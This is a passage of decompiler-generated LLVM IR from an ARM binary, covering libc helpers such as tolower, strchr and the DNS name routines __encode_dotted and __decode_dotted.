  %v2_122cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_122cc, i32* @r4, align 4
  ret i32 %v0_122c8

; uselistorder directives
  uselistorder i32 %v4_122a8, { 1, 0, 2 }
  uselistorder i32 ()* @__errno_location, { 45, 30, 44, 68, 67, 66, 27, 43, 29, 28, 42, 22, 41, 21, 36, 26, 25, 20, 12, 11, 10, 19, 9, 8, 7, 6, 18, 5, 4, 3, 69, 17, 16, 53, 52, 65, 64, 63, 32, 34, 59, 54, 37, 38, 50, 35, 49, 48, 31, 0, 24, 23, 1, 40, 39, 13, 51, 47, 15, 2, 62, 14, 61, 60, 46, 33, 58, 57, 56, 55 }
  uselistorder label %dec_label_pc_122c8, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_122d8 = icmp slt i32 %arg1, 0
  br i1 %v1_122d8, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_122d8 = mul i32 %arg1, 2
  %v2_122e4 = load i32, i32* bitcast (i32** @global_var_1d7ac.516 to i32*), align 4
  %v2_122e8 = add i32 %v2_122e4, %v2_122d8
  %v3_122ec = inttoptr i32 %v2_122e8 to i8*
  %v4_122ec = load i8, i8* %v3_122ec, align 1
  %v6_122ec = zext i8 %v4_122ec to i32
  %v1_122f0 = add i32 %v2_122e8, 1
  %v2_122f0 = inttoptr i32 %v1_122f0 to i8*
  %v3_122f0 = load i8, i8* %v2_122f0, align 1
  %v4_122f0 = zext i8 %v3_122f0 to i32
  %v3_122f4 = mul nuw i32 %v4_122f0, 16777216
  %v4_122f8 = sdiv i32 %v3_122f4, 65536
  %v5_122f8 = or i32 %v4_122f8, %v6_122ec
  ret i32 %v5_122f8

; uselistorder directives
  uselistorder i32 %v2_122e8, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_12304 = load i32, i32* @r5, align 4
  %v9_12304 = load i32, i32* @r6, align 4
  %v1_12308 = urem i32 %arg1, 256
  br label %dec_label_pc_12328

dec_label_pc_12310:                               ; preds = %dec_label_pc_12328
  %v3_12310 = load i8, i8* %.0, align 1
  %v4_12310 = zext i8 %v3_12310 to i32
  %v9_12314 = icmp eq i32 %v4_12310, %v1_12308
  br i1 %v9_12314, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_12310
  ret i32 %v1_12328

bb24:                                             ; preds = %dec_label_pc_12310
  %v2_1231c = icmp eq i8 %v3_12310, 0
  %v2_12320 = add i32 %v1_12328, 1
  %v3_12320 = inttoptr i32 %v2_12320 to i8*
  br i1 %v2_1231c, label %dec_label_pc_123fc, label %dec_label_pc_12328

dec_label_pc_12328:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_12320, %bb24 ]
  %v1_12328 = ptrtoint i8* %.0 to i32
  %v2_12328 = urem i32 %v1_12328, 4
  %v3_12328 = icmp eq i32 %v2_12328, 0
  br i1 %v3_12328, label %dec_label_pc_12330, label %dec_label_pc_12310

dec_label_pc_12330:                               ; preds = %dec_label_pc_12328
  %v4_12330 = mul nuw nsw i32 %v1_12308, 256
  %v5_12330 = or i32 %v4_12330, %v1_12308
  %v4_12338 = mul i32 %v5_12330, 65536
  %v5_12338 = or i32 %v4_12338, %v5_12330
  br label %dec_label_pc_1233c

dec_label_pc_1233c:                               ; preds = %dec_label_pc_123f4, %dec_label_pc_1237c, %dec_label_pc_12330
  %v0_123a0 = phi i32 [ %v1_12328, %dec_label_pc_12330 ], [ %v4_1233c, %dec_label_pc_1237c ], [ %v4_1233c, %dec_label_pc_123f4 ]
  %v1_1233c = inttoptr i32 %v0_123a0 to i32*
  %v2_1233c = load i32, i32* %v1_1233c, align 4
  %v4_1233c = add i32 %v0_123a0, 4
  %v2_12344 = xor i32 %v2_1233c, %v5_12338
  %v2_12350 = add i32 %v2_1233c, 2130640639
  %v1_12354 = sub i32 -1, %v2_1233c
  %v2_12358 = xor i32 %v2_12350, %v1_12354
  %v2_1235c = add i32 %v2_12344, 2130640639
  %v1_12364 = sub i32 -1, %v2_12344
  %v2_12368 = and i32 %v2_12358, -2130640640
  %v2_1236c = xor i32 %v2_1235c, %v1_12364
  %v2_12370 = icmp eq i32 %v2_12368, 0
  %v2_12374 = and i32 %v2_1236c, -2130640640
  store i32 %v2_12374, i32* @lr, align 4
  br i1 %v2_12370, label %dec_label_pc_1237c, label %dec_label_pc_12384

dec_label_pc_1237c:                               ; preds = %dec_label_pc_1233c
  %v2_1237c = icmp eq i32 %v2_12374, 0
  br i1 %v2_1237c, label %dec_label_pc_1233c, label %dec_label_pc_12384

dec_label_pc_12384:                               ; preds = %dec_label_pc_1233c, %dec_label_pc_1237c
  %v2_12384 = inttoptr i32 %v0_123a0 to i8*
  %v3_12384 = load i8, i8* %v2_12384, align 1
  %v4_12384 = zext i8 %v3_12384 to i32
  %v1_1238c = add i32 %v0_123a0, 1
  %v1_12390 = add i32 %v0_123a0, 2
  %v9_12394 = icmp eq i32 %v4_12384, %v1_12308
  %v1_12398 = add i32 %v0_123a0, 3
  store i32 %v1_12398, i32* @ip, align 4
  br i1 %v9_12394, label %dec_label_pc_123a0, label %dec_label_pc_123a8

dec_label_pc_123a0:                               ; preds = %dec_label_pc_12384
  store i32 %v6_12304, i32* @r5, align 4
  store i32 %v9_12304, i32* @r6, align 4
  ret i32 %v0_123a0

dec_label_pc_123a8:                               ; preds = %dec_label_pc_12384
  %v2_123a8 = icmp eq i8 %v3_12384, 0
  br i1 %v2_123a8, label %dec_label_pc_123fc, label %dec_label_pc_123b0

dec_label_pc_123b0:                               ; preds = %dec_label_pc_123a8
  %v2_123b0 = inttoptr i32 %v1_1238c to i8*
  %v3_123b0 = load i8, i8* %v2_123b0, align 1
  %v4_123b0 = zext i8 %v3_123b0 to i32
  %v9_123b4 = icmp eq i32 %v4_123b0, %v1_12308
  br i1 %v9_123b4, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_123b0
  store i32 %v6_12304, i32* @r5, align 4
  store i32 %v9_12304, i32* @r6, align 4
  ret i32 %v1_1238c

bb26:                                             ; preds = %dec_label_pc_123b0
  %v2_123bc = icmp eq i8 %v3_123b0, 0
  br i1 %v2_123bc, label %dec_label_pc_123fc, label %dec_label_pc_123c4

dec_label_pc_123c4:                               ; preds = %bb26
  %v2_123c4 = inttoptr i32 %v1_12390 to i8*
  %v3_123c4 = load i8, i8* %v2_123c4, align 1
  %v4_123c4 = zext i8 %v3_123c4 to i32
  %v9_123c8 = icmp eq i32 %v4_123c4, %v1_12308
  br i1 %v9_123c8, label %dec_label_pc_123d0, label %dec_label_pc_123d8

dec_label_pc_123d0:                               ; preds = %dec_label_pc_123c4
  store i32 %v6_12304, i32* @r5, align 4
  store i32 %v9_12304, i32* @r6, align 4
  ret i32 %v1_12390

dec_label_pc_123d8:                               ; preds = %dec_label_pc_123c4
  %v2_123d8 = icmp eq i8 %v3_123c4, 0
  br i1 %v2_123d8, label %dec_label_pc_123fc, label %dec_label_pc_123e0

dec_label_pc_123e0:                               ; preds = %dec_label_pc_123d8
  %v2_123e0 = inttoptr i32 %v1_12398 to i8*
  %v3_123e0 = load i8, i8* %v2_123e0, align 1
  %v4_123e0 = zext i8 %v3_123e0 to i32
  %v9_123e4 = icmp eq i32 %v4_123e0, %v1_12308
  br i1 %v9_123e4, label %dec_label_pc_123ec, label %dec_label_pc_123f4

dec_label_pc_123ec:                               ; preds = %dec_label_pc_123e0
  store i32 %v6_12304, i32* @r5, align 4
  store i32 %v9_12304, i32* @r6, align 4
  ret i32 %v1_12398

dec_label_pc_123f4:                               ; preds = %dec_label_pc_123e0
  %v2_123f4 = icmp eq i8 %v3_123e0, 0
  br i1 %v2_123f4, label %dec_label_pc_123fc, label %dec_label_pc_1233c

dec_label_pc_123fc:                               ; preds = %bb24, %dec_label_pc_123f4, %dec_label_pc_123d8, %bb26, %dec_label_pc_123a8
  store i32 %v6_12304, i32* @r5, align 4
  store i32 %v9_12304, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1233c, { 1, 0 }
  uselistorder i32 %v2_1233c, { 0, 2, 1 }
  uselistorder i32 %v0_123a0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_12330, { 1, 0 }
  uselistorder i32 %v1_12328, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_12308, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_12304, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_12304, { 3, 0, 1, 2, 4 }
  uselistorder i32 -2130640640, { 2, 5, 6, 7, 3, 0, 8, 4, 1 }
  uselistorder i32 2130640639, { 1, 2, 5, 6, 3, 0, 4 }
  uselistorder i8* undef, { 2, 1, 0 }
  uselistorder label %dec_label_pc_123fc, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_12384, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1240c = load i32, i32* @r4, align 4
  store i32 %v3_1240c, i32* %stack_var_-24, align 4
  %v6_1240c = load i32, i32* @r5, align 4
  %v9_1240c = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_12414 = load i32, i32* @r1, align 4
  store i32 %v0_12414, i32* @r6, align 4
  %v0_12418 = load i32, i32* @r2, align 4
  store i32 %v0_12418, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1248019 = icmp slt i8* %arg1, null
  store i1 %v1_1248019, i1* %cpsr_n.global-to-local, align 1
  %v2_1248020 = icmp eq i8* %arg1, null
  store i1 %v2_1248020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1248020, label %dec_label_pc_12498, label %dec_label_pc_1248c

dec_label_pc_12424:                               ; preds = %dec_label_pc_1248c
  %v2_12424 = call i32 @__GI_strchr(i32 %v0_1242421, i32 46)
  store i32 %v2_12424, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12428 = icmp slt i32 %v2_12424, 0
  store i1 %v1_12428, i1* %cpsr_n.global-to-local, align 1
  %v2_12428 = icmp eq i32 %v2_12424, 0
  store i1 %v2_12428, i1* %cpsr_z.global-to-local, align 1
  %v0_1242c = load i32, i32* @r4, align 4
  %v2_1242c = sub i32 %v2_12424, %v0_1242c
  store i32 %v2_1242c, i32* @ip, align 4
  store i32 %v0_1242c, i32* %r0.global-to-local, align 4
  br i1 %v2_12428, label %dec_label_pc_12438, label %dec_label_pc_12440

dec_label_pc_12438:                               ; preds = %dec_label_pc_12424
  %v1_12430 = inttoptr i32 %v0_1242c to i8*
  %v3_12438 = call i32 @strlen(i8* %v1_12430)
  store i32 %v3_12438, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_12438, 16777216
  %v1_1243c = sdiv i32 %sext, 16777216
  store i32 %v1_1243c, i32* @ip, align 4
  %v0_1244c.pre = load i32, i32* @r4, align 4
  %v0_1245c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12440

dec_label_pc_12440:                               ; preds = %dec_label_pc_12424, %dec_label_pc_12438
  %v0_1245c = phi i32 [ %v2_12424, %dec_label_pc_12424 ], [ %v0_1245c.pre, %dec_label_pc_12438 ]
  %v0_1244c = phi i32 [ %v0_1242c, %dec_label_pc_12424 ], [ %v0_1244c.pre, %dec_label_pc_12438 ]
  %v0_1246c = phi i32 [ %v2_1242c, %dec_label_pc_12424 ], [ %v1_1243c, %dec_label_pc_12438 ]
  %v0_12440 = load i32, i32* %r7.global-to-local, align 4
  %v1_12440 = add i32 %v0_12440, 1
  store i32 %v1_12440, i32* @lr, align 4
  %v1_12444 = load i32, i32* %r8.global-to-local, align 4
  %v2_12444 = sub i32 %v1_12444, %v0_12440
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12448 = icmp slt i32 %v0_1246c, 0
  store i1 %v1_12448, i1* %cpsr_n.global-to-local, align 1
  %v2_12448 = icmp eq i32 %v0_1246c, 0
  store i1 %v2_12448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1244c, i32* @r1, align 4
  %v0_12450 = load i32, i32* @r6, align 4
  %v2_12450 = add i32 %v0_12450, %v1_12440
  store i32 %v2_12450, i32* @r0, align 4
  store i32 %v0_1246c, i32* @r2, align 4
  %v1_12458 = add i32 %v2_12444, -1
  %v1_1245c = add i32 %v0_1245c, 1
  store i32 %v1_1245c, i32* @r4, align 4
  br i1 %v2_12448, label %.loopexit, label %dec_label_pc_12464

dec_label_pc_12464:                               ; preds = %dec_label_pc_12440
  %v2_12464 = sub i32 %v0_1246c, %v1_12458
  %v3_12464 = icmp ult i32 %v0_1246c, %v1_12458
  %v4_12464 = xor i32 %v1_12458, %v0_1246c
  %v5_12464 = xor i32 %v2_12464, %v0_1246c
  %v6_12464 = and i32 %v5_12464, %v4_12464
  %v7_12464 = icmp slt i32 %v6_12464, 0
  store i1 %v7_12464, i1* %cpsr_v.global-to-local, align 1
  %v8_12464 = icmp slt i32 %v2_12464, 0
  store i1 %v8_12464, i1* %cpsr_n.global-to-local, align 1
  %v9_12464 = icmp eq i32 %v0_1246c, %v1_12458
  store i1 %v9_12464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12464, label %dec_label_pc_1246c, label %.loopexit

dec_label_pc_1246c:                               ; preds = %dec_label_pc_12464
  %v1_1246c = trunc i32 %v0_1246c to i8
  %v4_1246c = add i32 %v0_12450, %v0_12440
  %v5_1246c = inttoptr i32 %v4_1246c to i8*
  store i8 %v1_1246c, i8* %v5_1246c, align 1
  %v0_12470 = load i32, i32* @lr, align 4
  %v1_12470 = load i32, i32* @ip, align 4
  %v2_12470 = add i32 %v1_12470, %v0_12470
  store i32 %v2_12470, i32* %r7.global-to-local, align 4
  %v0_12474 = call i32 @memcpy()
  store i32 %v0_12474, i32* %r0.global-to-local, align 4
  %v0_12478 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12478 = icmp slt i32 %v0_12478, 0
  store i1 %v1_12478, i1* %cpsr_n.global-to-local, align 1
  %v2_12478 = icmp eq i32 %v0_12478, 0
  store i1 %v2_12478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12478, label %dec_label_pc_12498, label %dec_label_pc_1246c.dec_label_pc_12480_crit_edge

dec_label_pc_1246c.dec_label_pc_12480_crit_edge:  ; preds = %dec_label_pc_1246c
  %v0_12480.pre = load i32, i32* @r4, align 4
  store i32 %v0_12480.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12480 = icmp slt i32 %v0_12480.pre, 0
  store i1 %v1_12480, i1* %cpsr_n.global-to-local, align 1
  %v2_12480 = icmp eq i32 %v0_12480.pre, 0
  store i1 %v2_12480, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12480, label %dec_label_pc_12498, label %dec_label_pc_1248c

dec_label_pc_1248c:                               ; preds = %entry, %dec_label_pc_1246c.dec_label_pc_12480_crit_edge
  %v0_1242421 = phi i32 [ %v0_12480.pre, %dec_label_pc_1246c.dec_label_pc_12480_crit_edge ], [ %tmp, %entry ]
  %v1_1248c = inttoptr i32 %v0_1242421 to i8*
  %v2_1248c = load i8, i8* %v1_1248c, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_12490 = icmp eq i8 %v2_1248c, 0
  store i1 %v2_12490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12490, label %dec_label_pc_12498, label %dec_label_pc_12424

dec_label_pc_12498:                               ; preds = %dec_label_pc_1246c.dec_label_pc_12480_crit_edge, %dec_label_pc_1246c, %dec_label_pc_1248c, %entry
  %v0_12498 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12498 = icmp slt i32 %v0_12498, 0
  store i1 %v1_12498, i1* %cpsr_n.global-to-local, align 1
  %v2_12498 = icmp eq i32 %v0_12498, 0
  store i1 %v2_12498, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_12498, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_12498
  %v5_124a0 = load i32, i32* %r7.global-to-local, align 4
  %v6_124a0 = add i32 %v5_124a0, 1
  store i32 %v6_124a0, i32* %r0.global-to-local, align 4
  %v7_124a4 = load i32, i32* @r6, align 4
  %v9_124a4 = add i32 %v7_124a4, %v5_124a0
  %v10_124a4 = inttoptr i32 %v9_124a4 to i8*
  store i8 0, i8* %v10_124a4, align 1
  %v0_124a8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_124a8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_124a8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_12498, %bb
  %v2_124a8 = phi i1 [ %v2_124a8.pre, %bb ], [ false, %dec_label_pc_12498 ]
  %v1_124a8 = phi i1 [ %v1_124a8.pre, %bb ], [ %v1_12498, %dec_label_pc_12498 ]
  %v0_124a8 = phi i1 [ %v0_124a8.pre, %bb ], [ %v2_12498, %dec_label_pc_12498 ]
  %v3_124a8 = xor i1 %v2_124a8, %v1_124a8
  %v4_124a8 = or i1 %v0_124a8, %v3_124a8
  br i1 %v4_124a8, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_124a8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_124a8, i32* @r4, align 4
  store i32 %v6_1240c, i32* @r5, align 4
  store i32 %v9_1240c, i32* @r6, align 4
  %v25_124a8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_124a8

.loopexit:                                        ; preds = %dec_label_pc_12464, %dec_label_pc_12440, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_124b0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_124b0, i32* @r4, align 4
  store i32 %v6_1240c, i32* @r5, align 4
  store i32 %v9_1240c, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_12498, { 0, 2, 1 }
  uselistorder i32 %v0_12480.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_12478, { 1, 0 }
  uselistorder i32 %v2_12464, { 1, 0 }
  uselistorder i32 %v1_12458, { 2, 0, 3, 1 }
  uselistorder i32 %v0_1246c, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1243c, { 1, 0 }
  uselistorder i32 %v0_1242c, { 0, 2, 1, 3 }
  uselistorder i1 %v2_1248020, { 1, 0 }
  uselistorder i32 %v9_1240c, { 1, 0 }
  uselistorder i32 %v6_1240c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 3, 8, 4, 6, 5, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i8*)* @strlen, { 11, 28, 27, 10, 9, 0, 3, 2, 29, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 8, 7, 6, 5, 4, 15, 14, 12, 13, 1 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0 }
  uselistorder i32 46, { 0, 2, 3, 1 }
  uselistorder i32* @r6, { 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 11, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 1, 0, 17, 18, 19, 20, 21, 85, 2, 86, 87, 88, 89, 90, 91, 92, 140, 3, 141, 142, 143, 93, 97, 96, 98, 99, 100, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 130, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 4, 157, 158, 159, 160, 161, 162, 163, 191, 196, 189, 190, 22, 23, 24, 27, 28, 29, 30, 25, 26, 31, 32, 33, 34, 35, 36, 37, 38, 131, 128, 129, 132, 133, 5, 134, 135, 136, 137, 138, 139, 6, 164, 165, 166, 167, 168, 169, 170, 171, 172, 101, 102, 103, 104, 105, 7, 12, 106, 39, 8, 40, 41, 107, 9, 108, 109, 173, 174, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 14, 15, 16, 175, 176, 177, 178, 192, 193, 194, 195, 13, 110, 111, 112, 113, 10, 114, 115, 116, 117, 94, 95, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_12498, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1248c, { 1, 0 }
  uselistorder label %dec_label_pc_12440, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_124b4 = load i32, i32* @r4, align 4
  %v6_124b4 = load i32, i32* @r5, align 4
  %v0_124b8 = load i32, i32* @r0, align 4
  store i32 %v0_124b8, i32* %sl.global-to-local, align 4
  %v2_124b8 = icmp eq i32 %v0_124b8, 0
  br i1 %v2_124b8, label %.thread16, label %dec_label_pc_12558.preheader

.thread16:                                        ; preds = %entry
  %v0_124c41 = load i32, i32* @r2, align 4
  store i32 %v0_124c41, i32* %sb.global-to-local, align 4
  %v0_124c82 = load i32, i32* @r3, align 4
  store i32 %v0_124c82, i32* %stack_var_-40, align 4
  br label %dec_label_pc_12578

dec_label_pc_12558.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_124c4 = load i32, i32* @r2, align 4
  store i32 %v0_124c4, i32* %sb.global-to-local, align 4
  %v0_124c8 = load i32, i32* @r3, align 4
  store i32 %v0_124c8, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_125583952 = load i32, i32* @r1, align 4
  %v2_125584053 = add i32 %v1_125583952, %v0_124b8
  %v3_125584154 = inttoptr i32 %v2_125584053 to i8*
  %v4_125584255 = load i8, i8* %v3_125584154, align 1
  %v6_125584356 = zext i8 %v4_125584255 to i32
  store i32 %v6_125584356, i32* @r4, align 4
  %v2_1255c4457 = icmp eq i8 %v4_125584255, 0
  br i1 %v2_1255c4457, label %bb35, label %dec_label_pc_124dc.lr.ph

dec_label_pc_124dc:                               ; preds = %dec_label_pc_124dc.lr.ph, %bb30
  %v2_1256450 = phi i1 [ %v2_125644663, %dec_label_pc_124dc.lr.ph ], [ true, %bb30 ]
  %v6_1255848 = phi i32 [ %v6_125584361, %dec_label_pc_124dc.lr.ph ], [ %v6_12558, %bb30 ]
  %v1_1255847 = phi i32 [ %v1_125583960, %dec_label_pc_124dc.lr.ph ], [ %v5_12504, %bb30 ]
  %v1_124e0 = and i32 %v6_1255848, 192
  br i1 %v2_1256450, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_124dc
  %v1_124e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_124e4 = add i32 %v1_124e4, 1
  store i32 %v2_124e4, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_124dc, %bb
  %v2_124e8 = icmp eq i32 %v1_124e0, 192
  %v1_124ec = add i32 %v1_1255847, 1
  store i32 %v1_124ec, i32* @r5, align 4
  br i1 %v2_124e8, label %dec_label_pc_124f4, label %dec_label_pc_12514

dec_label_pc_124f4:                               ; preds = %bb28
  %v2_124f4 = add i32 %v1_124ec, %v0_124f4.ph59
  %v3_124f4 = inttoptr i32 %v2_124f4 to i8*
  %v4_124f4 = load i8, i8* %v3_124f4, align 1
  %v6_124f4 = zext i8 %v4_124f4 to i32
  %v1_124fc = urem i32 %v6_1255848, 64
  br i1 %v2_1256450, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_124f4
  %v1_12500 = load i32, i32* %r8.global-to-local, align 4
  %v2_12500 = add i32 %v1_12500, 1
  store i32 %v2_12500, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_124f4, %bb29
  %v4_12504 = mul nuw nsw i32 %v1_124fc, 256
  %v5_12504 = or i32 %v6_124f4, %v4_12504
  store i32 %v5_12504, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_12558 = add i32 %v5_12504, %v0_124f4.ph59
  %v3_12558 = inttoptr i32 %v2_12558 to i8*
  %v4_12558 = load i8, i8* %v3_12558, align 1
  %v6_12558 = zext i8 %v4_12558 to i32
  store i32 %v6_12558, i32* @r4, align 4
  %v2_1255c = icmp eq i8 %v4_12558, 0
  br i1 %v2_1255c, label %dec_label_pc_12564.bb36_crit_edge, label %dec_label_pc_124dc

dec_label_pc_12514:                               ; preds = %bb28
  %v2_12514 = add i32 %v6_1255848, %storemerge17.ph58
  store i32 %v2_12514, i32* %r6.global-to-local, align 4
  %v2_12518 = load i32, i32* %stack_var_-40, align 4
  %v1_1251c = add i32 %v2_12514, 1
  store i32 %v1_1251c, i32* %r7.global-to-local, align 4
  %v3_12520 = icmp ult i32 %v1_1251c, %v2_12518
  br i1 %v3_12520, label %dec_label_pc_12528, label %dec_label_pc_12578

dec_label_pc_12528:                               ; preds = %dec_label_pc_12514
  %v2_12528 = add i32 %v1_124ec, %v0_124f4.ph59
  store i32 %v2_12528, i32* @r1, align 4
  %v0_1252c = load i32, i32* %sb.global-to-local, align 4
  %v2_1252c = add i32 %v0_1252c, %storemerge17.ph58
  store i32 %v2_1252c, i32* @r0, align 4
  store i32 %v6_1255848, i32* @r2, align 4
  %v0_12534 = call i32 @memcpy()
  %v0_12538 = load i32, i32* @r5, align 4
  %v1_12538 = load i32, i32* @r4, align 4
  %v2_12538 = add i32 %v1_12538, %v0_12538
  store i32 %v2_12538, i32* %r1.global-to-local, align 4
  %v0_1253c = load i32, i32* %sl.global-to-local, align 4
  %v2_1253c = add i32 %v0_1253c, %v2_12538
  %v3_1253c = inttoptr i32 %v2_1253c to i8*
  %v4_1253c = load i8, i8* %v3_1253c, align 1
  %v0_12540 = load i32, i32* %fp.global-to-local, align 4
  %v2_12540 = icmp eq i32 %v0_12540, 0
  br i1 %v2_12540, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_12528
  %v1_12544 = load i32, i32* %r8.global-to-local, align 4
  %v3_12544 = add i32 %v1_12544, %v1_12538
  store i32 %v3_12544, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_12528, %bb31
  %v2_12548 = icmp eq i8 %v4_1253c, 0
  br i1 %v2_12548, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_12550.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_12550 = load i32, i32* %sb.global-to-local, align 4
  %v3_12550 = load i32, i32* %r6.global-to-local, align 4
  %v4_12550 = add i32 %v3_12550, %v2_12550
  %v5_12550 = inttoptr i32 %v4_12550 to i8*
  store i8 %v0_12550.off0, i8* %v5_12550, align 1
  %v0_12554.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_12558.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_12564.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1255839 = load i32, i32* %r1.global-to-local, align 4
  %v2_1255840 = add i32 %v1_1255839, %v0_12558.pre.pre
  %v3_1255841 = inttoptr i32 %v2_1255840 to i8*
  %v4_1255842 = load i8, i8* %v3_1255841, align 1
  %v6_1255843 = zext i8 %v4_1255842 to i32
  store i32 %v6_1255843, i32* @r4, align 4
  %v2_1255c44 = icmp eq i8 %v4_1255842, 0
  %v2_1256446 = icmp eq i32 %v0_12564.pre.pre, 0
  br i1 %v2_1255c44, label %dec_label_pc_12564, label %dec_label_pc_124dc.lr.ph

dec_label_pc_124dc.lr.ph:                         ; preds = %dec_label_pc_12558.preheader, %bb34
  %v2_125644663 = phi i1 [ %v2_1256446, %bb34 ], [ false, %dec_label_pc_12558.preheader ]
  %v6_125584361 = phi i32 [ %v6_1255843, %bb34 ], [ %v6_125584356, %dec_label_pc_12558.preheader ]
